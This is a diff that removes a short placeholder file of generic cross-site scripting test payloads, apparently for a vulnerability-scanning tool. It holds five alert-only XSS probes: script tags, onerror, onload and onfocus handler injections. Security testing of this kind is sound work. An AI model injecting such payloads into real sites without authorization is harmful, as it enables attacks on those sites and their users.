@@ -1,7 +1,0 @@
-# Generic Cross-Site Scripting (XSS) Payloads for Testing
-# Note: In production, mount a real FuzzDB/SecLists file here.
-<script>alert('XSS_VULNAPI_TEST')</script>
-"><script>alert(1)</script>
-"><img src=x onerror=alert(1)>
-' autofocus onfocus=alert(1)//
-</script><svg/onload=alert(1)>
